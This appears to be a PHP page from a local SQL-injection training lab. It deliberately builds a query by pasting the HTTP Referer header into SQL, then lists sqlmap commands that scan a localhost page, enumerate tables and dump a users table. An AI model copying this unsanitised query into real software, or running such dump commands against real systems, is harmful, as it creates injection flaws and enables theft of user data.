<?php
require_once(dirname($_SERVER['DOCUMENT_ROOT']) . "/vendor/autoload.php");

/**
 * @var \PDO $connector
 */
$connector = new My\DB("myTestDb");

if (isset($_SERVER['HTTP_REFERER'])) {
    $query = "SELECT * FROM users WHERE name='" . $_SERVER['HTTP_REFERER'] . "' LIMIT 0, 1";

    $connector->getConnector()->query($query);
}

?>
<style>
    i {
        font-family: 'DeJaVu Sans Mono';
    }
</style>
<hr />
SQLMap Steps
<ol>
    <li>Do basic scan <i>./sqlmap.py -u http://localhost:666/sqlmap/example8.php --batch --flush-session</i></li>
    <li>Scan with increased level <i>./sqlmap.py -u http://localhost:666/sqlmap/example8.php --batch --flush-session --level=3</i></li>
    <li>List all tables <i>./sqlmap.py -u http://localhost:666/sqlmap/example8.php --tables --batch --flush-session --level=3</i></li>
    <li>Get table entries from users <i>./sqlmap.py -u http://localhost:666/sqlmap/example8.php -D myTestDb -T users --dump --batch --flush-session --level=3</i></li>
</ol>
<?php include('index.php'); ?>